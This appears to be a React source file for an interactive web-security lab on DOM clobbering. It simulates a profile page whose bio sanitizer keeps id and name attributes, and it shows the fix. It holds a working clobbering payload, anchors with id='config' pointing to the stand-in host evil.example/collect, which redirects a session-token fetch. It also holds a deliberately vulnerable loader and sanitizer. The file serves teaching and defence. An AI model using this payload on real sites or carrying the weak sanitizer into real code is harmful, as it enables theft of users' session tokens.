import { useCallback, useEffect, useState } from "react";
import LabPage from "../components/lab/LabPage.jsx";
import { Workstation, VictimWindow, PayloadButton, Console, logEntry } from "../components/lab/Workstation.jsx";
import { LABS } from "../lib/labsMeta.js";

const lab = LABS[0];

/* ─────────────────────────────────────────────────────────────────────────
   REAL DOM clobbering, against this very page.

   The victim profile renders the user's bio with innerHTML after a sanitizer
   that strips scripts and event handlers — but keeps id/name attributes. Two
   anchors with id="config" therefore become a real global: window.config is an
   HTMLCollection, and window.config.apiUrl is the anchor named "apiUrl", whose
   string value is its href.

   - Vulnerable loader: window.config || DEFAULTS  → reads the injected anchor.
   - Patched loader:    a frozen module constant   → the DOM can't reach it.

   No request is ever sent; the "token send" only records where it would go.
   ───────────────────────────────────────────────────────────────────────── */

const SAFE_API = "https://api.ada.profile/v1";
const ATTACKER_API = "https://evil.example/collect";
const DEFAULT_BIO = "Building small tools for the web.";
const CLOBBER_BIO = `Building small tools for the web. <a id="config"></a><a id="config" name="apiUrl" href="${ATTACKER_API}">my portfolio ↗</a>`;

// A "safe" sanitizer of the kind DOM clobbering slips past: no scripts, no
// on* handlers, no javascript: URLs — ids and names are left alone.
function sanitize(html) {
  const t = document.createElement("template");
  t.innerHTML = html;
  t.content.querySelectorAll("script,style,iframe,object,embed,link,meta").forEach((n) => n.remove());
  t.content.querySelectorAll("*").forEach((el) => {
    for (const a of [...el.attributes]) {
      if (/^on/i.test(a.name) || /^\s*javascript:/i.test(a.value)) el.removeAttribute(a.name);
    }
  });
  return t.innerHTML;
}

const DEFAULTS = { apiUrl: SAFE_API };
const vulnerableLoader = () => String((window.config || DEFAULTS).apiUrl);
const CONFIG = Object.freeze({ apiUrl: SAFE_API });
const patchedLoader = () => CONFIG.apiUrl;

function describeGlobal() {
  const v = window.config;
  if (v === undefined) return "undefined";
  if (v instanceof HTMLCollection) return `HTMLCollection(${v.length})`;
  if (v instanceof Element) return `<${v.tagName.toLowerCase()}#${v.id}>`;
  return typeof v;
}
const host = (url) => new URL(url).hostname;

function ClobberSandbox({ mode, onModeChange }) {
  const [bio, setBio] = useState(DEFAULT_BIO);
  const [endpoint, setEndpoint] = useState(null);
  const [globalInfo, setGlobalInfo] = useState("undefined");
  const [status, setStatus] = useState("live");
  const [pulse, setPulse] = useState(0);
  const [logs, setLogs] = useState([]);

  const addLog = useCallback((f) => setLogs((l) => [...l, logEntry(f)]), []);
  const hit = (s) => {
    setStatus(s);
    setPulse((p) => p + 1);
  };

  // Read the real global after React has committed the bio to the DOM.
  useEffect(() => {
    setGlobalInfo(describeGlobal());
  }, [bio]);

  const reset = useCallback(() => {
    setBio(DEFAULT_BIO);
    setEndpoint(null);
    setStatus("live");
    setLogs([
      logEntry({
        origin: "sandbox",
        status: "INFO",
        detail:
          mode === "fixed"
            ? "PATCHED build — the token request reads a frozen module constant."
            : "VULNERABLE build — the token request reads window.config.",
      }),
    ]);
  }, [mode]);

  useEffect(() => {
    reset();
  }, [reset]);

  const postBio = () => {
    setBio(CLOBBER_BIO);
    addLog({
      origin: "profile form → sanitize()",
      payload: `<a id="config"></a><a id="config" name="apiUrl" href="//evil.example/collect">`,
      status: "SENT",
      detail: 'The sanitizer passed it — no <script>, no on* handlers. Two elements now carry id="config".',
    });
  };

  const syncSession = () => {
    const clobbered = window.config !== undefined;
    const url = mode === "fixed" ? patchedLoader() : vulnerableLoader();
    setEndpoint(url);

    if (url === ATTACKER_API) {
      hit("exploited");
      addLog({
        origin: "syncSession()",
        payload: "fetch(String(config.apiUrl), { body: token })",
        status: "EXPLOITED",
        detail: `loadConfig() returned the injected anchor, and String(apiUrl) is its href. The session token went to ${host(url)}.`,
      });
    } else if (clobbered) {
      hit("blocked");
      addLog({
        origin: "syncSession()",
        payload: "fetch(CONFIG.apiUrl, { body: token })",
        status: "BLOCKED",
        detail: `window.config is still ${describeGlobal()}, but the patched code reads a module constant. The token stayed on ${host(url)}.`,
      });
    } else {
      addLog({
        origin: "syncSession()",
        status: "INFO",
        detail: `window.config is undefined, so the token went to ${host(url)} as normal. Fire payload 01 first.`,
      });
    }
  };

  const inspectGlobal = () => {
    const info = describeGlobal();
    const api = window.config ? String(window.config.apiUrl) : "—";
    addLog({
      origin: "x-ray · window",
      payload: "window.config",
      status: "INFO",
      detail:
        info === "undefined"
          ? "window.config → undefined. Nothing has claimed the name yet."
          : `window.config → ${info}; String(config.apiUrl) → "${api}".${
              mode === "fixed" ? " The patch doesn't clean the page — it stops trusting it." : ""
            }`,
    });
  };

  const tokenTarget = endpoint ?? null;
  const leaked = tokenTarget === ATTACKER_API;

  return (
    <Workstation
      plate={lab.num}
      mode={mode}
      onModeChange={onModeChange}
      onReset={reset}
      victim={
        <VictimWindow url="ada.profile/settings" status={status} pulse={pulse}>
          <div className="p-5">
            <div className="flex items-center gap-3">
              <span className="h-10 w-10 rounded-full border border-white/15 bg-white/10" />
              <div>
                <p className="text-sm font-semibold text-white/90">ada_lovelace</p>
                <p className="text-[11px] text-white/40">Member since 2019</p>
              </div>
            </div>

            <p className="mt-5 font-mono text-[10px] tracking-[0.18em] text-white/35">BIO</p>
            <div
              className="mt-1.5 min-h-12 text-[13px] leading-6 text-white/75 [&_a]:underline [&_a]:decoration-white/30 [&_a]:underline-offset-2"
              onClickCapture={(e) => {
                if (e.target.closest("a")) e.preventDefault();
              }}
              dangerouslySetInnerHTML={{ __html: sanitize(bio) }}
            />

            <div className="mt-5 overflow-hidden rounded-md border border-white/10 font-mono text-[11px]">
              <div className="flex items-center justify-between gap-3 border-b border-white/10 px-3 py-2">
                <span className="text-white/40">SESSION TOKEN</span>
                <span className="text-white/70">tok_live_••••4f2a</span>
              </div>
              <div className={`flex items-center justify-between gap-3 px-3 py-2 transition-colors duration-300 ${leaked ? "bg-white text-[#050505]" : ""}`}>
                <span className={leaked ? "" : "text-white/40"}>SENT TO</span>
                <span className={`truncate ${leaked ? "font-medium" : "text-white/70"}`}>
                  {tokenTarget ? host(tokenTarget) : "not sent yet"}
                </span>
              </div>
            </div>
          </div>

          <div className="border-t border-dashed border-white/15 px-5 py-3 font-mono text-[11px]">
            <p className="text-white/35">X-RAY · LIVE GLOBAL</p>
            <p className="mt-1 text-white/55">
              window.config → <span className="text-white">{globalInfo}</span>
            </p>
          </div>
        </VictimWindow>
      }
      payloads={
        <>
          <PayloadButton
            n="01"
            title="Post a bio with a link"
            code={`<a id=config name=apiUrl href=//evil.example>`}
            onClick={postBio}
          />
          <PayloadButton
            n="02"
            title="Trigger the session sync"
            code="fetch(String(config.apiUrl), { body: token })"
            onClick={syncSession}
          />
          <PayloadButton n="03" tag="RECON" title="X-ray the global" code="window.config" onClick={inspectGlobal} />
        </>
      }
      console={<Console logs={logs} onClear={() => setLogs([])} />}
    />
  );
}

const LINE = {
  file: "profile.js — vulnerable",
  lines: [
    { code: "// profile.js — show the user's bio, then sync their session" },
    { code: "bio.innerHTML = sanitize(user.bio); // strips <script> and on* handlers" },
    { code: "" },
    { code: "function loadConfig() {" },
    {
      code: "  return window.config || DEFAULTS;",
      mark: "fracture",
      note: 'window.config is meant to be app config, but any element with id="config" defines it too. The sanitizer kept the injected link, so this line picks up attacker markup.',
    },
    { code: "}" },
    { code: "" },
    { code: "function syncSession() {" },
    { code: "  const { apiUrl } = loadConfig();" },
    { code: "  fetch(String(apiUrl), {" },
    { code: '    method: "POST",' },
    { code: "    body: JSON.stringify({ token: session.token })," },
    { code: "  });" },
    { code: "}" },
  ],
};

const FIX = {
  file: "config.js — patched",
  lines: [
    { code: "// config.js — a module binding, not a global lookup" },
    {
      code: 'const CONFIG = Object.freeze({ apiUrl: "https://api.ada.profile/v1" });',
      mark: "patch",
      note: "A module-scoped constant can't be reached through DOM named access, so injected ids no longer change where the token goes.",
    },
    { code: "" },
    { code: "export function syncSession() {" },
    { code: "  fetch(CONFIG.apiUrl, {" },
    { code: '    method: "POST",' },
    { code: "    body: JSON.stringify({ token: session.token })," },
    { code: "  });" },
    { code: "}" },
  ],
};

export default function Lab01DomClobbering() {
  const [mode, setMode] = useState("vulnerable");
  return (
    <LabPage
      lab={lab}
      what={
        <>
          DOM clobbering is HTML injection that needs no script. An element like{" "}
          <code className="font-mono text-[0.9em] text-white">{'<a id="config">'}</code> automatically becomes a global
          variable, <code className="font-mono text-[0.9em] text-white">window.config</code>, so injected markup can
          overwrite a global your JavaScript trusts. Sanitizers that only strip scripts and event handlers let it straight
          through.
        </>
      }
      line={LINE}
      sandbox={<ClobberSandbox mode={mode} onModeChange={setMode} />}
      why={
        <>
          Clobbering turns harmless-looking user HTML — a bio, a comment, an email — into control over the variables
          behind security decisions: API endpoints, redirect URLs, even sanitizer settings. It slips past filters
          precisely because it contains no JavaScript.
        </>
      }
      incident={{
        label: "2019",
        title: "Gmail AMP4Email",
        text: "Security researcher Michał Bentkowski showed an XSS in Gmail's dynamic AMP emails that worked by clobbering a global with crafted element ids. Google fixed it after his report.",
      }}
      fix={FIX}
      sources={[
        { label: "PortSwigger Web Security Academy — DOM clobbering", href: "https://portswigger.net/web-security/dom-based/dom-clobbering" },
        { label: "OWASP — DOM Clobbering Prevention Cheat Sheet", href: "https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html" },
        { label: "MITRE — CWE-79: Improper Neutralization of Input During Web Page Generation", href: "https://cwe.mitre.org/data/definitions/79.html" },
      ]}
      onVerifyFix={() => setMode("fixed")}
    />
  );
}
